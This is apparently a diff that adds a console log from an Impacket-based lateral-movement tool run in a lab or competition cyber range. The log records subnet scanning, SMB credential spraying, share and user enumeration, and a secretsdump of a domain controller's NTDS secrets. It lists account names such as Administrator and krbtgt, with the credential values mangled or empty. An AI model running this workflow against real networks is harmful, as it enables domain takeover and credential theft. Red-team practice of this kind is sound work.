@@ -1,0 +1,156 @@
+
+    ╔═══════════════════════════════════════════════════════════╗
+    ║  Enhanced Lateral Movement Tool v1.0                      ║
+    ║  Based on Impacket Framework                              ║
+    ║  For Authorized Penetration Testing Only                  ║
+    ╚═══════════════════════════════════════════════════════════╝
+    
+[*] [+] Added credential: lab.local\svc_sql
+[*] [*] Starting automated lateral movement...
+[*] [*] Scanning 100.65.7.0/24 for active hosts...
+[*] [+] Found active host: 100.65.7.12
+[*] [+] Found active host: 100.65.7.25
+[*] [+] Found active host: 100.65.7.148
+[*] [*] Discovered 3 potential targets
+[*] [+] Potential DC found: 100.65.7.12
+[*] [+] Potential DC found: 100.65.7.25
+[*] [+] Potential DC found: 100.65.7.148
+[*] [!] High-value targets identified: 100.65.7.12, 100.65.7.25, 100.65.7.148
+[*] [*] === Pivot Level 1 ===
+[*] [*] Spraying 1 credentials across 3 targets
+[*] [+] Valid credentials on 100.65.7.12: lab.local\svc_sql
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[*] [+] Share found on 100.65.7.12: ADMIN$
+[*] [+] Share found on 100.65.7.12: C$
+[*] [+] Share found on 100.65.7.12: IPC$
+[*] [+] Share found on 100.65.7.12: NETLOGON
+[*] [+] Share found on 100.65.7.12: SYSVOL
+[*] [+] Logged-on user on 100.65.7.12: cyberrange
+[*] [+] Logged-on user on 100.65.7.12: cyberrange
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [*] Attempting to dump secrets from 100.65.7.12
+[*] [*] Running secretsdump.py on 100.65.7.12...
+[*] [+] Added credential: nthash)
+Administrato\r
+[*] [+] Found credential: nthash)
+Administrato\r
+[*] [+] Added credential: nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrato\r
+[*] [+] Found credential: nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrato\r
+[*] [+] Added credential: 
+krbtg\t
+[*] [+] Found credential: 
+krbtg\t
+[*] [+] Added credential: 
+cyberrang\e
+[*] [+] Found credential: 
+cyberrang\e
+[*] [+] Added credential: 
+cloudbase-ini\t
+[*] [+] Found credential: 
+cloudbase-ini\t
+[*] [+] Added credential: 
+svc_sq\l
+[*] [+] Found credential: 
+svc_sq\l
+[*] [+] Added credential: 
+svc_we\b
+[*] [+] Found credential: 
+svc_we\b
+[*] [+] Added credential: 
+AX6740-DC01\$
+[*] [+] Found credential: 
+AX6740-DC01\$
+[*] [+] Added credential: 
+WEB01\$
+[*] [+] Found credential: 
+WEB01\$
+[*] [+] Added credential: 
+APP01\$
+[*] [+] Found credential: 
+APP01\$
+[*] [+] Successfully dumped secrets from 100.65.7.12
+[*] [+] Discovered 10 new credentials
+[*] [+] Compromised 1 new hosts, pivoting deeper...
+[*] [*] === Pivot Level 2 ===
+[*] [*] Spraying 11 credentials across 3 targets
+[*] [+] Valid credentials on 100.65.7.12: lab.local\svc_sql
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.12: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.25: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[+] [-] Failed on 100.65.7.148: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[*] [+] Share found on 100.65.7.12: ADMIN$
+[*] [+] Share found on 100.65.7.12: C$
+[*] [+] Share found on 100.65.7.12: IPC$
+[*] [+] Share found on 100.65.7.12: NETLOGON
+[*] [+] Share found on 100.65.7.12: SYSVOL
+[*] [+] Logged-on user on 100.65.7.12: cyberrange
+[*] [+] Logged-on user on 100.65.7.12: cyberrange
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [+] Logged-on user on 100.65.7.12: AX6740-DC01$
+[*] [*] Attempting to dump secrets from 100.65.7.12
+[*] [*] Running secretsdump.py on 100.65.7.12...
+[*] [+] Found credential: nthash)
+Administrato\r
+[*] [+] Found credential: nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrato\r
+[*] [+] Found credential: 
+krbtg\t
+[*] [+] Found credential: 
+cyberrang\e
+[*] [+] Found credential: 
+cloudbase-ini\t
+[*] [+] Found credential: 
+svc_sq\l
+[*] [+] Found credential: 
+svc_we\b
+[*] [+] Found credential: 
+AX6740-DC01\$
+[*] [+] Found credential: 
+WEB01\$
+[*] [+] Found credential: 
+APP01\$
+[*] [+] Successfully dumped secrets from 100.65.7.12
+[*] [+] Discovered 10 new credentials
+[*] [+] Report generated: competition_report.json
+[*] [+] Compromised 1 hosts
+[*] [+] Discovered 11 credentials
+[*] [+] Credentials exported to discovered_creds.json
